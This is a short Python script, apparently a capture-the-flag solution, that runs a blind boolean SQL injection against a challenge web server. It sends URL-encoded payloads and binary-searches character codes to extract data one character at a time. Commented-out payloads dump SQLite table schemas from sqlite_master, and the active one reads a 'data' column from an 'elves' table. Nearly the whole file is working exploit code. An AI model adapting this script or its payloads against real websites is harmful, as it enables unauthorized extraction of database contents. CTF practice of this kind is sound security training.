import requests

#base = "http://challs.htsp.ro:13001/1%20AND%20(SELECT%20unicode(substr(sql,_pos_,1))%20FROM%20sqlite_master%20WHERE%20type='table'%20and%20tbl_name%20not%20like%20'sqlite_%25'%20limit%201%20offset%200)%20%3E%20_mid_;--"
#base = "http://challs.htsp.ro:13001/1%20AND%20(SELECT%20COUNT(*)%20FROM%20sqlite_master%20WHERE%20type='table'%20and%20tbl_name%20not%20like%20'sqlite_%25')%20%3E%20_mid_;--"
base = "http://challs.htsp.ro:13001/1%20AND%20(SELECT%20unicode(substr(data,_pos_,1))%20FROM%20elves%20where%20id%20=%202)%20%3E%20_mid_;--"
def sqli(pos, mid):
    r = base.replace("_pos_", str(pos)).replace("_mid_", str(mid))
    r = requests.get(r)
    return "Error" not in r.text

def get_char(pos):
    lo, hi = 0, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)
    #return lo

import sys
for i in range(500):
    print(get_char(i), end="")
    sys.stdout.flush()
